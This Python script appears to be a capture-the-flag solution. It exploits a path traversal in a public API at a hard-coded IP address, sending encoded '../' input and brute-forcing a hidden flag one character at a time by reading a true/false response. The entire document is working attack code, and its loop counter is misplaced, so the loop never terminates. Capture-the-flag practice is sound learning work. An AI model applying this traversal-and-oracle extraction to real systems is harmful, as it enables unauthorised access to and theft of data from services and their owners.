import requests
import string

charset = string.ascii_letters + string.digits + '{_+=}'

my_data = {'text': '%2E%2E/looksLikeFlag?flag=FLAG{3asy_p4th_tr4vers4l}'}

def return_none():

    c = 0
    while c < 10:
        for i in charset:
            te_data = my_data['text']
            te_data = ''.join([my_data['text'], i])
            d= {'text': te_data}

            r = requests.post(
                "http://139.162.96.221:5000/public_api", json=d)

            if(r.content == b'{"looksLikeFlag":true}'):
                my_data['text'] = te_data
                print('******')
                print(te_data)
                print('******')
                break
            
            print(r.content)
    c=c+1


return_none()